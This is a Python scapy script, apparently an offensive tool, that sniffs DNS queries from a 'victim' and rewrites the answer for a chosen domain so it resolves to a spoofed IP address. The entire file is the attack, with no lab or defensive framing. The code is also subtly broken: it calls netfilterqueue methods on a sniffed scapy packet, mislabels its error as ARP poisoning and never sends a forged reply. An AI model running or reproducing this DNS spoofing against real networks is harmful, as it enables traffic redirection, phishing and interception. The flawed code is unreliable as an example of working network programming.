import scapy.all as sc;
import time;
import ipaddress;

def dns_spoofing(domain, spoof_ip):
    iface = ""

    try:
        # Sniff for DNS packet
        pkt = sc.sniff(
            filter="ip",
            iface=iface,
            store=1,
            stop_filter=lambda p: (
                p.haslayer(sc.IP)
                and p.haslayer(sc.UDP)
                and p[sc.UDP].dport == 53
        ))[0]

        handle_dns_query(pkt, domain, spoof_ip)

    except Exception as e:
        print(f"[!] Error during ARP poisoning: {e}")
        return None, None
    

def modify_packet(packet, spoof_ip):
    qname = packet[sc.DNSQR].qname
    packet[sc.DNS].an = sc.DNSRR(rrname=qname, rdata=spoof_ip)
    packet[sc.DNS].ancount = 1

    del packet[sc.IP].len
    del packet[sc.IP].chksum
    del packet[sc.UDP].len
    del packet[sc.UDP].chksum

    return packet

def handle_dns_query(pkt, domain, spoof_ip):
    # Ensure it's a DNS packet
    if pkt.haslayer(sc.DNS) and pkt.haslayer(sc.DNSQR):

        # Extract metadata
        query_domain = pkt[sc.DNSQR].qname.decode() if hasattr(pkt[sc.DNSQR].qname, "decode") else pkt[sc.DNSQR].qname
        query_type = pkt[sc.DNSQR].qtype
        tx_id = pkt[sc.DNS].id
        src_ip = pkt[sc.IP].src

        print("\n=== DNS Query Detected ===")
        print(f"Victim IP:        {src_ip}")
        print(f"Requested Domain: {query_domain}")
        print(f"Query Type:       {query_type}")
        print(f"Transaction ID:   {tx_id}")

        if domain.encode() in query_domain.lower().encode():
            print(f"[!] Domain MATCH: Victim requested {query_domain}")
            modified_packet = modify_packet(pkt, spoof_ip)
            pkt.set_payload(bytes(modified_packet))
            pkt.accept()